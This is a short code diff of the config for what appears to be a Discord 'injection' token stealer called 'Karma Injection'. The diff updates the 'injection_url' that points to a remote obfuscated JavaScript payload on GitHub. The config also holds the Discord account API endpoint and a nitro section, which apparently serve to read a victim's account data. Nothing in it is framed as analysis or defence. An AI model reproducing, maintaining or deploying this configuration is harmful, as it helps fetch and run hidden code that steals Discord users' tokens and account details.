@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Karma Injection', 
   embed_icon: 'https://raw.githubusercontent.com/gzlaw/injection/main/pfp/bin.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/gzlaw/injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/gzlaw/injection/main/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
